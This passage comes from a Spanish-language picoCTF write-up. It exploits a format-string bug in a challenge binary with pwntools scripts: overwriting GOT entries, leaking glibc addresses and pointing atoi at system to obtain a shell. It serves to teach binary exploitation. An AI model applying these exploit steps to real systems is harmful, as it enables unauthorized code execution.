<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Si ejecutamos el <em>script</em>, GDB toma el proceso, se para en <code>pow</code> y muestra la GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  →  0x7f4c7b0845a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  →  0x7f4c7b08bc50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  →  0x7f4c7b061e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  →  0x7f4c7b061ee0</span>
[0x601040] <span class="code-dark-green">pow@GLIBC_2.2.5  →  0x28</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  →  0x7f4c7b1837b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  →  0x7f4c7b10e130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  →  0x7f4c7b044730</span>
</code></pre></div><h3 id="explotación-manual">Explotación manual</h3><p>La entrada de <code>pow</code> se ha cambiado a <code>0x28</code> (40). Esto significa que hasta <code>$11$n</code> se han impreso 40 bytes. Como hemos puesto <code>1.</code> antes de <code>%11$n</code>, hay 38 bytes en la pila antes. Si ponemos <code>1..</code>, la entrada de la GOT cambiaría a <code>0x29</code> y sucesivamente.</p><p>En este momento, necesitamos introducir la dirección del <code>main</code> (<code>0x400837</code>, que es 4196407 en decimal) en la entrada de la GOT. Sin embargo, no podemos introducir tantos caracteres porque son demasiados.</p><p>Pero podemos utilizar otro formato. Como la dirección que necesitamos escribir es 4196407, entonces necesitamos que se impriman 4196407 - 38 - 2 = 4196367 bytes. Y esto se puede hacer con un formato como <code>%4196367c</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">pow_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601040</span>
<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>  
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.</span><span class="mtk6">%4196367c</span><span class="mtk4">'</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>El cálculo del número de bytes a imprimir se puede realizar así también:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">pow_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601040</span>
<span class="mtk1">bytes_on_stack</span> <span class="mtk5">=</span> <span class="mtk6">38</span>
<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">main_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span>

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>  
</code></pre></div><p>Y funciona, hemos convertido <code>pow</code> en <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 389440  
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> 1
B: <span class="code-red">$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> 1
B: <span class="code-red">$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span>
</code></pre></div><p>Ahora tenemos más opciones para continuar con la explotación. Lo siguiente es fugar una dirección de Glibc para obtener su versión. El propósito de esto es calcular la dirección real de <code>system</code> y ponerla en otra entrada de la GOT para la fase final.</p><h3 id="realizando-fugas-de-memoria">Realizando fugas de memoria</h3><p>Para fugar una dirección podemos utilizar la vulnerabilidad de <em>Format String</em>. Para ello, tenemos que llamar a <code>printf</code> con el formato <code>%s</code> (las cadenas de caracteres en C son dadas como punteros) y pasarle una dirección de la GOT (por ejemplo, <code>puts</code>), de manera que el valor de la entrada de la GOT se imprima (funciona como un puntero).</p><p>La estrategia es similar: utilizamos la variable <code>A</code> para almacenar la dirección de la GOT para <code>puts</code>. Y después ponemos <code>%11$s</code> en la variable <code>B</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">puts_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601018</span>
<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">puts_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$s'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">1.'</span><span class="mtk1">)</span>

<span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>Después de esto, podemos calcular la dirección base de Glibc, sabiendo el <em>offset</em> de <code>puts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">chall</span>
        linux-vdso.so.1 (0x00007ffda1df7000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> puts
   194: 00000000000875a0   476 FUNC    GLOBAL DEFAULT   16 _IO_<span class="code-red">puts</span>@@GLIBC_2.2.5
   429: 00000000000875a0   476 FUNC    WEAK   DEFAULT   16 <span class="code-red">puts</span>@@GLIBC_2.2.5
   504: 00000000001273c0  1268 FUNC    GLOBAL DEFAULT   16 <span class="code-red">puts</span>pent@@GLIBC_2.2.5
   690: 0000000000129090   728 FUNC    GLOBAL DEFAULT   16 <span class="code-red">puts</span>gent@@GLIBC_2.10
  1158: 0000000000085e60   384 FUNC    WEAK   DEFAULT   16 f<span class="code-red">puts</span>@@GLIBC_2.2.5
  1705: 0000000000085e60   384 FUNC    GLOBAL DEFAULT   16 _IO_f<span class="code-red">puts</span>@@GLIBC_2.2.5
  2342: 00000000000914a0   159 FUNC    WEAK   DEFAULT   16 f<span class="code-red">puts</span>_unlocked@@GLIBC_2.2.5  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">puts_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">875a0</span>
<span class="mtk1">glibc_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">puts_addr</span> <span class="mtk5">-</span> <span class="mtk1">puts_offset</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>Con todo esto, hemos fugado la dirección de <code>puts</code> y calculado la dirección base de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 414163  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f4a695695a0
[<span class="code-green">+</span>] Glibc base address: 0x7f4a694e2000
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span>
</code></pre></div><p>Ahora podemos buscar el <em>offset</em> de <code>system</code> en Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   236: 0000000000156a80   103 FUNC    GLOBAL DEFAULT   16 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   617: 0000000000055410    45 FUNC    GLOBAL DEFAULT   16 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1427: 0000000000055410    45 FUNC    WEAK   DEFAULT   16 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><p>La idea es modificar la entrada de la GOT de una función que tome como primer argumento una cadena de caracteres controlada por nosotros para que apunte a <code>system</code>. Por ejemplo, funciones de este tipo son <code>atoi</code> y <code>strcspn</code>. Esta vez, estaremos utilizando <code>atoi</code>, cuya dirección en la GOT es <code>0x601058</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">atoi_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601058</span>

<span class="mtk1">system_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">55410</span>
<span class="mtk1">system_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">system_offset</span>  
</code></pre></div><h3 id="sobrescritura-de-la-got">Sobrescritura de la GOT</h3><p>Ahora tenemos que escribir la dirección real de <code>system</code> en la entrada GOT de <code>atoi</code>. Vamos a introducir 0 bytes y ver qué valor se inserta en la GOT utilizando GDB como anteriormente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">pow_got</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$n'</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">atoi</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>  

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Si lo ejecutamos, GDB se añade al proceso, se para en <code>atoi</code> y muestra la GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  →  0x7f660b8465a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  →  0x7f660b84dc50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  →  0x7f660b823e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  →  0x7f660b823ee0</span>
[0x601040] <span class="code-dark-green">pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  →  0x7f660b9457b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  →  0x7f660b8d0130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  →  0x7f6600000028</span>
</code></pre></div><p>Como se puede ver, la entrada de <code>atoi</code> tiene valor <code>0x7f6600000028</code>. Con <code>%11$n</code> hemos sobrescrito los últimos 4 bytes (es decir, <code>0x00000028</code>). Utilizando el mismo procedimiento de antes, necesitamos escribir un montón de bytes. El número de bytes a introducir se puede calcular como:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_on_stack</span> <span class="mtk5">=</span> <span class="mtk6">38</span>
<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk1">system_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span>  
</code></pre></div><p>Limitamos el número a 4 bytes por si acaso. Y después lo añadimos al <em>payload</em> y lo enviamos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk1">system_addr</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span>  

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$n'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Si todo es correcto, la entrada de <code>atoi</code> en la GOT apuntará a <code>system</code>. Y por tanto, podemos introducir <code>/bin/sh</code> en <code>A</code> o <code>B</code> y obtener una consola de comandos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 502833  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f4a096565a0
[<span class="code-green">+</span>] Glibc base address: 0x7f4a095cf000
[<span class="code-blue">*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class="code-red">$</span> /bin/sh
B: <span class="code-red">$</span>
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><p>Todo bien. Vamos a perfeccionar el <em>exploit</em> un poco para que nos dé la <em>shell</em> automáticamente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)</span>  
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 507100  
[<span class="code-green">+</span>] Leaked puts() address: 0x7f6218d5b5a0
[<span class="code-green">+</span>] Glibc base address: 0x7f6218cd4000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><h3 id="encontrando-la-versión-de-glibc-remota">Encontrando la versión de Glibc remota</h3><p>No obstante, aún no hemos terminado. Tenemos que lanzar el <em>exploit</em> contra la instancia remota y obtener la versión de Glibc. Después, actualizar los <em>offsets</em>.</p><p>Para ayudar con la búsqueda de la versión, podemos fugar más direcciones de funciones de Glibc. Para ello, decidí programar una función llamada <code>leak_address</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk9 mtki">got_entry</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">int</span><span class="mtk1">:</span>
    <span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk9 mtki">got_entry</span><span class="mtk1">)</span>
    <span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1.%11$s'</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">1.'</span><span class="mtk1">)</span>

    <span class="mtk5">return</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
</code></pre></div><p>De manera que se utilice así:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">atoi_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601058</span>
<span class="mtk1">atoi_addr</span> <span class="mtk5">=</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">atoi()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">atoi_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">puts_got</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">601018</span>
<span class="mtk1">puts_addr</span> <span class="mtk5">=</span> <span class="mtk8">leak_address</span><span class="mtk1">(</span><span class="mtk1">puts_got</span><span class="mtk1">)</span>
<span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">puts()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>Lanzamos el <em>exploit</em> al servidor y no funciona. Sin problema por ahora. Vamos a verificar las direcciones fugadas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mars.picoctf.net 31929
[<span class="code-green">+</span>] Opening connection to mars.picoctf.net on port 31929: Done  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7f026a26c730
[<span class="code-green">+</span>] Leaked puts() address: 0x7f026a2ac5a0
[<span class="code-green">+</span>] Glibc base address: 0x7f026a225000
</code></pre></div><p>Estas son las versiones de Glibc encontradas (sus <em>offsets</em> son los mismos):</p><p><img src="/images/picoCTF/fermat-strings-libc.png" alt="Glibc Version"></p><p>Observamos que la versión de Glibc que tiene la instancia remota es la misma que tenemos en local.</p><p>Sin embargo, parece que la última etapa del <em>exploit</em> no funciona en remoto. Esto puede deberse a que estamos imprimiendo una gran cantidad de bytes para poder utilizar <code>%n</code>. Una mamera más elegante es usar <code>%hhn</code> para escribir un solo byte o <code>%hn</code> para escribir 2 bytes.</p><h3 id="corrigiendo-el-_exploit_">Corrigiendo el <em>exploit</em></h3><p>Vamos a modificar el <em>payload</em> para tener un <em>exploit</em> más estable. Por el momento, utilizaremos <code>%hn</code>. Los últimos bytes de la GOT pueden ser sobrescritos de manera similar a la de antes, solo con algunos cambios:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">((</span><span class="mtk1">system_addr</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>  

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$hn'</span>

